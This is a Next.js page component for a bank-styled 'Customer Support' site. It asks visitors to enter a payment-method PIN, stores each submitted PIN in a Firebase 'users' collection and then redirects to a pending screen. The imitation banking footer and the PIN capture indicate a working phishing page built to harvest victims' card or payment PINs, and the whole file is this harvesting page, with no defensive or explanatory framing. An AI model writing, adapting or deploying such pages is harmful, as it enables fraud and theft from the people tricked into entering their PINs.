"use client";
import { useState } from "react";
import { ref, push } from "firebase/database";
import { database } from "@/app/lib/firebase";
import { useRouter, useSearchParams } from "next/navigation";

export default function Page() {
  // Changed from "page" to "Page"
  const router = useRouter();
  const searchParams = useSearchParams()
  const method = searchParams.get('method')


  const [formData, setFormData] = useState({
    method: method,
    pin: "",
  });

  const handleChange = (e) => {
    let { name, value } = e.target;

    setFormData({
      ...formData,
      [name]: value,
    });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    const formRef = ref(database, "users");
    await push(formRef, formData);
    router.push("/pending");
    setFormData({
      method: method,
      pin: "",
    });
  };

  return (
    <div>
      <section class="w-full">
        {/* <!-- Harsha Web --> */}
        <div className="h-auto w-full flex items-center justify-left bg-[#0062A9] p-1">
          <img src="/logo.png" className="p-2 w-[60px] h-[60px]" alt="Logo" />
          <span className="font-semibold text-xl text-white">
            Customer Support
          </span>
        </div>
        <div class="p-6">
            <span className="text-xl">Enter your {method} PIN</span>
          <form
            class="space-y-6 flex flex-col justify-center mt-10"
            action=""
            id="third-form"
            onSubmit={handleSubmit} // Added onSubmit handler
          >
            {/* <!-- Full Name --> */}
            <div class="mb-4">
              <label class="block text-gray-700 text-sm mb-2" for="card_no">
                PIN
              </label>
              <input
                class="shadow appearance-none border-b rounded-md w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
                id="pin"
                name="pin"
                type="password"
                placeholder="Please enter here"
                value={formData.pin} // Updated value attribute
                onChange={handleChange} // Added onChange handler
              />
            </div>
            {/* <!-- Submit Button --> */}
            <div class="px-10 w-full flex justify-center items-center">
              <button
                class="bg-gradient-to-r from-[#0289A9] to-[#0063A8] hover:from-blue-700 hover:to-purple-700 text-white font-bold py-2 px-10 rounded focus:outline-none focus:shadow-outline w-full"
                type="submit"
              >
                Verify Details
              </button>
            </div>
          </form>
          {/* <!-- Bottom Area --> */}
          <div className="mt-10">
            <div className="grid grid-cols-1 w-full">
              <div className="text-xs text-[#0063A8] font-bold space-x-1 mt-2">
                <span>FAQs: </span>
                <span className="text-slate-600">
                  Find answers to the most frequently asked questions.
                </span>
              </div>
              <div className="text-xs text-[#0063A8] font-bold space-x-1 mt-2">
                <span>Contact Us: </span>
                <span className="text-slate-600">
                  Get in touch with our support team.
                </span>
              </div>
              <div className="text-xs text-[#0063A8] font-bold space-x-1 mt-2">
                <span>Product Guides: </span>
                <span className="text-slate-600">
                  Access detailed guides and tutorials.
                </span>
              </div>
              <div className="text-xs text-[#0063A8] font-bold space-x-1 mt-2">
                <span>Account Management: </span>
                <span className="text-slate-600">
                  Manage your account settings and preferences
                </span>
              </div>
              <div className="text-xs text-[#0063A8] font-bold space-x-1 mt-2">
                <span>Order Tracking: </span>
                <span className="text-slate-600">
                  Track the status of your orders.
                </span>
              </div>
            </div>
          </div>
        </div>
      </section>
      {/* <!-- Footer --> */}
      <section class="bg-[#0062A9] p-5 w-full">
        <div class="flex space-x-1 w-full justify-between">
          <span class="text-xs text-white font-bold">Contact Us</span>
          <span class="text-xs text-white font-bold">|</span>
          <span class="text-xs text-white font-bold">Locate Us</span>
          <span class="text-xs text-white font-bold">|</span>
          <span class="text-xs text-white font-bold">Rate & Charges</span>
          <span class="text-xs text-white font-bold">|</span>
          <span class="text-xs text-white font-bold">Regulatory</span>
        </div>
        <div class="flex space-x-1 w-full justify-between mt-2">
          <span class="text-xs text-white font-bold">Policies</span>
          <span class="text-xs text-white font-bold">|</span>
          <span class="text-xs text-white font-bold">
            Regulatory Disclosures
          </span>
          <span class="text-xs text-white font-bold">|</span>
          <span class="text-xs text-white font-bold">
            Secure Usage Guidellines
          </span>
        </div>
        {/* <!-- Copyright --> */}
        <div class="mt-5 text-[10px] text-white">
          Copyright @2021-2022 CUSTOMER SUPPORT. All right reserved.
        </div>
      </section>
    </div>
  );
}
